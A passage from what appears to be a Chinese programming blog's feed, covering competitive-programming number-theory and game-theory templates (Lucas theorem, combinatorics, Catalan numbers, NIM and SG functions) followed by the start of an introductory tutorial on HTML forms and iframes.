<span class="hljs-keyword">int</span> p)</span>    <span class="hljs-comment">// 快速幂模板</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (k)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (k &amp; <span class="hljs-number">1</span>) res = (LL)res * a % p;<br>        a = (LL)a * a % p;<br>        k &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-comment">// 预处理阶乘的余数和阶乘逆元的余数</span><br>fact[<span class="hljs-number">0</span>] = infact[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; N; i ++ )<br>&#123;<br>    fact[i] = (LL)fact[i - <span class="hljs-number">1</span>] * i % mod;<br>    infact[i] = (LL)infact[i - <span class="hljs-number">1</span>] * qmi(i, mod - <span class="hljs-number">2</span>, mod) % mod;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="4-15-Lucas定理"><a href="#4-15-Lucas定理" class="headerlink" title="4.15 Lucas定理"></a>4.15 Lucas定理</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">若p是质数，则对于任意整数 <span class="hljs-number">1</span> &lt;= m &lt;= n，有：<br>    C(n, m) = C(n % p, m % p) * C(n / p, m / p) (mod p)<br><br><span class="hljs-keyword">int</span> qmi(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> k, <span class="hljs-keyword">int</span> p)  <span class="hljs-comment">// 快速幂模板</span><br>&#123;<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">1</span> % p;<br>    <span class="hljs-keyword">while</span> (k)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (k &amp; <span class="hljs-number">1</span>) res = (LL)res * a % p;<br>        a = (LL)a * a % p;<br>        k &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">C</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b, <span class="hljs-keyword">int</span> p)</span>  <span class="hljs-comment">// 通过定理求组合数C(a, b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (a &lt; b) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    LL x = <span class="hljs-number">1</span>, y = <span class="hljs-number">1</span>;  <span class="hljs-comment">// x是分子，y是分母</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = a, j = <span class="hljs-number">1</span>; j &lt;= b; i --, j ++ )<br>    &#123;<br>        x = (LL)x * i % p;<br>        y = (LL) y * j % p;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> x * (LL)qmi(y, p - <span class="hljs-number">2</span>, p) % p;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">lucas</span><span class="hljs-params">(LL a, LL b, <span class="hljs-keyword">int</span> p)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (a &lt; p &amp;&amp; b &lt; p) <span class="hljs-keyword">return</span> C(a, b, p);<br>    <span class="hljs-keyword">return</span> (LL)C(a % p, b % p, p) * lucas(a / p, b / p, p) % p;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="4-16-分解质因数法求组合数"><a href="#4-16-分解质因数法求组合数" class="headerlink" title="4.16 分解质因数法求组合数"></a>4.16 分解质因数法求组合数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">当我们需要求出组合数的真实值，而非对某个数的余数时，分解质因数的方式比较好用：<br>    <span class="hljs-number">1.</span> 筛法求出范围内的所有质数<br>    <span class="hljs-number">2.</span> 通过 C(a, b) = a! / b! / (a - b)! 这个公式求出每个质因子的次数。 n! 中p的次数是 n / p + n / p^<span class="hljs-number">2</span> + n / p^<span class="hljs-number">3</span> + ...<br>    <span class="hljs-number">3.</span> 用高精度乘法将所有质因子相乘<br><br><span class="hljs-keyword">int</span> primes[N], cnt;     <span class="hljs-comment">// 存储所有质数</span><br><span class="hljs-keyword">int</span> sum[N];     <span class="hljs-comment">// 存储每个质数的次数</span><br><span class="hljs-keyword">bool</span> st[N];     <span class="hljs-comment">// 存储每个数是否已被筛掉</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_primes</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span>      <span class="hljs-comment">// 线性筛法求素数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">if</span> (!st[i]) primes[cnt ++ ] = i;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; primes[j] &lt;= n / i; j ++ )<br>        &#123;<br>            st[primes[j] * i] = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">if</span> (i % primes[j] == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n, <span class="hljs-keyword">int</span> p)</span>       <span class="hljs-comment">// 求n！中的次数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (n)<br>    &#123;<br>        res += n / p;<br>        n /= p;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">mul</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; a, <span class="hljs-keyword">int</span> b)</span>       <span class="hljs-comment">// 高精度乘低精度模板</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; c;<br>    <span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; a.size(); i ++ )<br>    &#123;<br>        t += a[i] * b;<br>        c.push_back(t % <span class="hljs-number">10</span>);<br>        t /= <span class="hljs-number">10</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (t)<br>    &#123;<br>        c.push_back(t % <span class="hljs-number">10</span>);<br>        t /= <span class="hljs-number">10</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> c;<br>&#125;<br><br>get_primes(a);  <span class="hljs-comment">// 预处理范围内的所有质数</span><br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; cnt; i ++ )     <span class="hljs-comment">// 求每个质因数的次数</span><br>&#123;<br>    <span class="hljs-keyword">int</span> p = primes[i];<br>    sum[i] = get(a, p) - get(b, p) - get(a - b, p);<br>&#125;<br><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; res;<br>res.push_back(<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; cnt; i ++ )     <span class="hljs-comment">// 用高精度乘法将所有质因子相乘</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; sum[i]; j ++ )<br>        res = mul(res, primes[i]);<br><br></code></pre></div></td></tr></table></figure><h3 id="4-17-卡特兰数"><a href="#4-17-卡特兰数" class="headerlink" title="4.17 卡特兰数"></a>4.17 卡特兰数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">给定n个<span class="hljs-number">0</span>和n个<span class="hljs-number">1</span>，它们按照某种顺序排成长度为<span class="hljs-number">2</span>n的序列，满足任意前缀中<span class="hljs-number">0</span>的个数都不少于<span class="hljs-number">1</span>的个数的序列的数量为： Cat(n) = C(<span class="hljs-number">2</span>n, n) / (n + <span class="hljs-number">1</span>)<br></code></pre></div></td></tr></table></figure><h3 id="4-18-NIM游戏"><a href="#4-18-NIM游戏" class="headerlink" title="4.18 NIM游戏"></a>4.18 NIM游戏</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">给定N堆物品，第i堆物品有Ai个。两名玩家轮流行动，每次可以任选一堆，取走任意多个物品，可把一堆取光，但不能不取。取走最后一件物品者获胜。两人都采取最优策略，问先手是否必胜。<br><br>我们把这种游戏称为NIM博弈。把游戏过程中面临的状态称为局面。整局游戏第一个行动的称为先手，第二个行动的称为后手。若在某一局面下无论采取何种行动，都会输掉游戏，则称该局面必败。<br>所谓采取最优策略是指，若在某一局面下存在某种行动，使得行动后对面面临必败局面，则优先采取该行动。同时，这样的局面被称为必胜。我们讨论的博弈问题一般都只考虑理想情况，即两人均无失误，都采取最优策略行动时游戏的结果。<br>NIM博弈不存在平局，只有先手必胜和先手必败两种情况。<br><br>定理： NIM博弈先手必胜，当且仅当 A1 ^ A2 ^ … ^ An != <span class="hljs-number">0</span><br><br></code></pre></div></td></tr></table></figure><h3 id="4-19-公平组合游戏ICG"><a href="#4-19-公平组合游戏ICG" class="headerlink" title="4.19 公平组合游戏ICG"></a>4.19 公平组合游戏ICG</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">若一个游戏满足：<br><br><span class="hljs-number">1.</span>由两名玩家交替行动；<br><span class="hljs-number">2.</span>在游戏进程的任意时刻，可以执行的合法行动与轮到哪名玩家无关；<br><span class="hljs-number">3.</span>不能行动的玩家判负；<br><br>则称该游戏为一个公平组合游戏。<br>NIM博弈属于公平组合游戏，但城建的棋类游戏，比如围棋，就不是公平组合游戏。因为围棋交战双方分别只能落黑子和白子，胜负判定也比较复杂，不满足条件<span class="hljs-number">2</span>和条件<span class="hljs-number">3</span>。<br></code></pre></div></td></tr></table></figure><h3 id="4-20-有向图游戏"><a href="#4-20-有向图游戏" class="headerlink" title="4.20 有向图游戏"></a>4.20 有向图游戏</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">给定一个有向无环图，图中有一个唯一的起点，在起点上放有一枚棋子。两名玩家交替地把这枚棋子沿有向边进行移动，每次可以移动一步，无法移动者判负。该游戏被称为有向图游戏。<br>任何一个公平组合游戏都可以转化为有向图游戏。具体方法是，把每个局面看成图中的一个节点，并且从每个局面向沿着合法行动能够到达的下一个局面连有向边。<br></code></pre></div></td></tr></table></figure><h3 id="4-21-Mex运算"><a href="#4-21-Mex运算" class="headerlink" title="4.21 Mex运算"></a>4.21 Mex运算</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">设S表示一个非负整数集合。定义mex(S)为求出不属于集合S的最小非负整数的运算，即：<br>mex(S) = min&#123;x&#125;, x属于自然数，且x不属于S<br></code></pre></div></td></tr></table></figure><h3 id="4-22-SG函数"><a href="#4-22-SG函数" class="headerlink" title="4.22 SG函数"></a>4.22 SG函数</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">在有向图游戏中，对于每个节点x，设从x出发共有k条有向边，分别到达节点y1, y2, …, yk，定义SG(x)为x的后继节点y1, y2, …, yk 的SG函数值构成的集合再执行mex(S)运算的结果，即：<br>SG(x) = mex(&#123;SG(y1), SG(y2), …, SG(yk)&#125;)<br>特别地，整个有向图游戏G的SG函数值被定义为有向图游戏起点s的SG函数值，即SG(G) = SG(s)。<br></code></pre></div></td></tr></table></figure><h3 id="4-23-有向图游戏的和"><a href="#4-23-有向图游戏的和" class="headerlink" title="4.23 有向图游戏的和"></a>4.23 有向图游戏的和</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">设G1, G2, …, Gm 是m个有向图游戏。定义有向图游戏G，它的行动规则是任选某个有向图游戏Gi，并在Gi上行动一步。G被称为有向图游戏G1, G2, …, Gm的和。<br>有向图游戏的和的SG函数值等于它包含的各个子游戏SG函数值的异或和，即：<br>SG(G) = SG(G1) ^ SG(G2) ^ … ^ SG(Gm)<br></code></pre></div></td></tr></table></figure><h3 id="4-24-定理"><a href="#4-24-定理" class="headerlink" title="4.24 定理"></a>4.24 定理</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">有向图游戏的某个局面必胜，当且仅当该局面对应节点的SG函数值大于0。<br>有向图游戏的某个局面必败，当且仅当该局面对应节点的SG函数值等于0。<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ACM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-HTML基础知识复习（二）</title>
    <link href="/2021/05/11/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-HTML%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2021/05/11/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-HTML%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>HTML是用于创建网页的语言。我们通过使用HTML标记标签创建html文档来创建网页。HTML代表超文本标记语言。HTML是一种标记语言，它具有标记标签的集合。<br>HTML标签是由尖括号括起来的词，如&lt;html&gt;， &lt;body&gt;。标签通常成对出现，例如&lt;html&gt;和&lt;/html&gt;。<br>一对中的第一个标签是开始标签;第二个标签是结束标签。在上面的示例中，&lt;html&gt;是开始标签，而&lt;/html&gt;是结束标签。<br>我们还可以将开始标签称为起始标签，结束标签称为闭合标签。<br><strong>注意：</strong>并不是所有的标签都有结束标签的！！！<br><strong>注意：</strong>在本文中，有人民币符号￥的，表示自闭合标签，即不需要结束标签的。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-表单（-lt-form-gt-）"><a href="#1-表单（-lt-form-gt-）" class="headerlink" title="1.表单（&lt;form&gt;）"></a>1.表单（&lt;form&gt;）</h2><p>HTML 表单用于收集不同类型的用户输入。表单是一个包含表单元素的区域。表单元素是允许用户在表单中输入内容，比如：文本域 (textarea)、下拉列表、单选框 (radio-buttons)、复选框 (checkboxes)等等。<br>表单使用表单标签 &lt;form&gt; 来设置。</p><h3 id="1-1输入元素、创建按钮（-lt-input-gt-）"><a href="#1-1输入元素、创建按钮（-lt-input-gt-）" class="headerlink" title="1.1输入元素、创建按钮（&lt;input&gt;）"></a>1.1输入元素、创建按钮（&lt;input&gt;）</h3><p>多数情况下被用到的表单标签是输入标签（&lt;input&gt;）。&lt;input&gt; 元素是最重要的表单元素。输入类型是由类型属性（type）定义的。大多数经常被用到的输入类型如：文本域（Text Fields）、密码字段（password）、单选按钮（Radio Buttons）、复选框（Checkboxes）、提交按钮 (Submit Button)等等。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Hello world!&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-1-1-文本域（Text-Fields）"><a href="#1-1-1-文本域（Text-Fields）" class="headerlink" title="1.1.1 文本域（Text Fields）"></a>1.1.1 文本域（Text Fields）</h3><p>文本域通过 &lt;input type=”text”&gt; 标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br>姓名: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;firstname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>       <br>电话号码: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;lastname&quot;</span>&gt;</span>      <br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><strong>注意</strong>：表单本身并不可见。同时，在大多数浏览器中，文本域的缺省宽度是 20 个字符。</p><h3 id="1-1-2-密码字段（password）"><a href="#1-1-2-密码字段（password）" class="headerlink" title="1.1.2 密码字段（password）"></a>1.1.2 密码字段（password）</h3><p>密码字段通过标签 &lt;input type=”password”&gt; 来定义。<br>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>        <br>密码: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;pwd&quot;</span>&gt;</span>        <br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><strong>注意</strong>：密码字段字符不会明文显示，而是以星号或圆点替代。</p><h3 id="1-1-3-单选按钮（Radio-Buttons）"><a href="#1-1-3-单选按钮（Radio-Buttons）" class="headerlink" title="1.1.3 单选按钮（Radio Buttons）"></a>1.1.3 单选按钮（Radio Buttons）</h3><p>&lt;input type=”radio”&gt; 标签定义了表单单选框选项。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>        <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;male&quot;</span>&gt;</span>男<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>      <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;female&quot;</span>&gt;</span>女       <br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-1-4-复选框（Checkboxes）"><a href="#1-1-4-复选框（Checkboxes）" class="headerlink" title="1.1.4 复选框（Checkboxes）"></a>1.1.4 复选框（Checkboxes）</h3><p>&lt;input type=”checkbox”&gt; 定义了复选框。用户需要从若干给定的选择中选取一个或若干选项。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>      <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;vehicle&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Bike&quot;</span>&gt;</span>我有自行车<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>      <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;vehicle&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Car&quot;</span>&gt;</span>我有小车<br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-1-5-提交按钮-Submit-Button"><a href="#1-1-5-提交按钮-Submit-Button" class="headerlink" title="1.1.5 提交按钮 (Submit Button)"></a>1.1.5 提交按钮 (Submit Button)</h3><p>&lt;input type=”submit”&gt; 定义了提交按钮。当用户单击确认按钮时，表单的内容会被传送到另一个文件。表单的动作属性定义了目的文件的文件名。由动作属性定义的这个文件通常会对接收到的输入数据进行相关的处理。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;input&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;html_form_action.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span><br>Username: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>假如您在文本框内键入几个字母，然后点击确认按钮，那么输入数据会传送到 “html_form_action.php” 的页面。该页面将显示出输入的结果。</p><h3 id="1-1-6-下拉列表"><a href="#1-1-6-下拉列表" class="headerlink" title="1.1.6 下拉列表"></a>1.1.6 下拉列表</h3><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;cars&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;volvo&quot;</span>&gt;</span>Volvo<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;saab&quot;</span>&gt;</span>Saab<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;fiat&quot;</span> <span class="hljs-attr">selected</span>&gt;</span>Fiat<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span> <br><span class="hljs-comment">&lt;!--selected为选择默认显示选项，没有selected则选择第一个值为默认显示--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;audi&quot;</span>&gt;</span>Audi<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="2-框架"><a href="#2-框架" class="headerlink" title="2.框架"></a>2.框架</h2><p>&lt;iframe&gt;标签规定一个内联框架。一个内联框架被用来在当前 HTML 文档中嵌入另一个文档。通过使用框架，你可以在同一个浏览器窗口中显示不止一个页面。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span 